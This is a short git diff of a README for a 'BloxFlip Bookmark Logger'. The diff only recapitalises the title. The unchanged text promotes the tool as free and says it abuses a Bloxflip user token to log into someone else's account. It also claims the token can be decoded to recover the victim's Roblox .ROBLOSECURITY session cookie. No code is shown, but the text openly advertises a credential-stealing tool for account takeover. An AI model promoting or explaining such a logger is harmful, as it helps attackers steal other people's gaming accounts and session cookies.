@@ -1,5 +1,5 @@
 # BloxFlip-Bookmark-Logger
-free bloxflip bookmark logger
+Free Bloxflip Bookmark Logger
 this abuses bloxflip's user token, as it can be used to login to someones bloxflip account. the login token is basically an encoded version of the user's .ROBLOSECURITY. if you have a brain, you can decode it and get their origonal .ROBLOSECURITY cookie.
 made by a;#0002 :)
 
